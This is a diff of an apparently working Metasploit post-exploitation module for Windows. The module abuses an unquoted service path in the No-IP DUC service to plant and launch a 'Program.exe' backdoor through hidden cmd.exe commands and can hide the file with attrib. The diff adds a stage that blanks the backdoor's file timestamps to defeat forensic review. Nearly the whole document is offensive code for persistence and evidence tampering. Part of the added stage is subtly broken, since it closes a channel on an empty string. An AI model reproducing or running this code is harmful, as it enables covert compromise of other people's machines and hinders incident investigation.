@@ -59,6 +59,7 @@
 # Input full path of Program.exe to be uploaded   => set LOCAL_PATH /root/Program.exe
 # Check pdfcDispatcher service auto-start status? => set SERVICE_STATUS true
 # use attrib to hidde your program.exe in target? => set HIDDEN_ATTRIB true
+# Blank remote backdoor timestomp attributs?      => set BLANK_TIMESTOMP true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -118,8 +119,8 @@ class MetasploitModule < Msf::Post
                                         'SpecialThanks: milton_barra', # testing/debug module
                                 ],
   
-                        'Version'        => '$Revision: 1.4',
-                        'DisclosureDate' => 'nov 17 2016',
+                        'Version'        => '$Revision: 1.5',
+                        'DisclosureDate' => 'nov 18 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true', # requires elevated privileges
@@ -149,6 +150,7 @@ class MetasploitModule < Msf::Post
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                 OptString.new('LOCAL_PATH', [ false, 'The full path of Program.exe to be uploaded']),
                                 OptBool.new('SERVICE_STATUS', [ false, 'Check remote NoIPDUCService4 service settings?' , false]),
+                                OptBool.new('BLANK_TIMESTOMP', [ false, 'Blank remote backdoor timestomp attributs?' , false]),
                                 OptBool.new('HIDDEN_ATTRIB', [ false, 'Use Attrib command to Hide Program.exe?' , false])
                         ], self.class)
   
@@ -180,10 +182,10 @@ def ls_stage1
  
   r=''
   session = client
-  bin_shell = "Program.exe"                                  # service-binary name
-  bin_path = "C:\\Program.exe"                               # remote deploy path
-  local_path = datastore['LOCAL_PATH']                       # /root/Program.exe
-  service_path = "%programfiles%\\No-IP\\ducservice.exe"     # binary_path_name
+  bin_shell = "Program.exe"                                   # service-binary name
+  bin_path = "C:\\Program.exe"                                # remote deploy path
+  local_path = datastore['LOCAL_PATH']                        # /root/Program.exe
+  service_path = "%programfiles(x86)%\\No-IP\\ducservice.exe" # binary_path_name
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['LOCAL_PATH'] == 'nil'
@@ -216,17 +218,6 @@ def ls_stage1
  
     # move payload to the rigth directory (unquoted service path)
     r = session.sys.process.execute("cmd.exe /c move /y %temp%\\#{bin_shell} #{bin_path}", nil, {'Hidden' => true, 'Channelized' => true})
-
-      # check if remote path exists?
-      if bin_path.nil?
-        print_error("ABORT: post-module cant find backdoor binary...")
-        print_error("Please check: #{bin_path}")
-        return
-      end
-
-    # Change payload timestamp (date:time)
-    print_good(" Blanking backdoor agent timestamp...")
-    client.priv.fs.blank_file_mace(bin_path)
     sleep(1.5)
     r = session.sys.process.execute("cmd.exe /c sc start NoIPDUCService4", nil, {'Hidden' => true, 'Channelized' => true})
 
@@ -443,6 +434,57 @@ end
  
  
  
+# -------------------------------
+# BLANK BACKDOOR TIMESTOMP VALUES
+# -------------------------------
+def ls_stage4
+
+  r=''
+  session = client
+  bin_name = "C:\\Program.exe"
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options...
+  if datastore['LOCAL_PATH'] == 'nil'
+    print_error("Options not configurated correctly...")
+    print_warning("Please set LOCAL_PATH option!")
+    return nil
+  else
+    print_status("Blank backdoor timestamp attributes!")
+    sleep(1.5)
+  end
+
+
+    # check if backdoor.exe exist in target
+    if client.fs.file.exist?("#{bin_name}")
+      print_good(" Backdoor agent: #{bin_name} found!")
+      sleep(1.5)
+
+      # Change payload timestamp (date:time)
+      print_good(" Blanking backdoor agent timestamp...")
+      client.priv.fs.blank_file_mace("#{bin_name}")
+      sleep(1.5)
+
+        # diplay output to user
+        print_status("#{bin_name} timestomp successefully blanked!")
+        print_line("")
+
+      # close channel when done
+      r.channel.close
+      r.close
+
+    else
+      print_error("ABORT: post-module cant find backdoor agent path...")
+      print_error("BACKDOOR_AGENT: #{bin_name}")
+      print_line("")
+    end
+
+
+  # error exception funtion
+  rescue ::Exception => e
+  print_error("Error: #{e.class} #{e}")
+end
+
+
  
 # ------------------------------------------------
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
@@ -501,6 +543,10 @@ def run
  
       if datastore['SERVICE_STATUS']
          ls_stage3
+      end
+
+      if datastore['BLANK_TIMESTOMP']
+         ls_stage4
       end
    end
 end
